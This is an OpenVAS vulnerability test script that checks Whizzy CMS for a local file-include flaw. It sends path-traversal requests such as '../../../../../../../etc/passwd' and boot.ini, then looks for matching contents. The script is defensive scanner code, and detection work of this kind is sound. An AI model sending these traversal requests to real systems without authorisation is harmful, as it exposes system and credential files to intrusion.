###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_whizzy_cms_41703.nasl 14 2013-10-27 12:33:37Z jan $
#
# Whizzy CMS 'whizzycms1001.php' Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Whizzy CMS is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and to execute arbitrary local scripts in
the context of the webserver process. This may allow the attacker
to compromise the application and the computer; other attacks are
also possible.

Whizzy CMS 10.01 and 10.02 are vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(100739);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-08-03 13:36:27 +0200 (Tue, 03 Aug 2010)");
 script_bugtraq_id(41703);
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_name("Whizzy CMS 'whizzycms1001.php' Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/41703");
 script_xref(name : "URL" , value : "http://unverse.net/Whizzy-CMS");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if Whizzy CMS is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/cms","/whizzy",cgi_dirs());
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/index.php?../../../../../../../",files[file]); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_hole(port:port);
      exit(0);

    }
  }  
}

exit(0);
